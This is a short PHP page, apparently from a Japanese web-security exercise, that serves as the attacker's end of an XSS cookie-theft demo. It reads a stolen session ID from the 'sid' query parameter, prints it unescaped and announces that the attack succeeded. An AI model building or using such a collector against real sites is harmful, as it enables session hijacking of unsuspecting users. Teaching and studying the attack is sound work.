<?php
/**
 *
 * クッキー値の盗み出し
 *
 * Created by IntelliJ IDEA.
 * User: xsmiledur
 * Date: 2017/06/12
 * Time: 15:48
 */

$sid = $_GET['sid'];
?>

<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <title>クッキー値の盗み出し</title>
    <meta name="viewport" content="width=device-width">
    <link rel="stylesheet" href="style.css">
</head>
<body>
攻撃成功！<br>
Cookieは<br><?php echo $sid; ?>

</body>
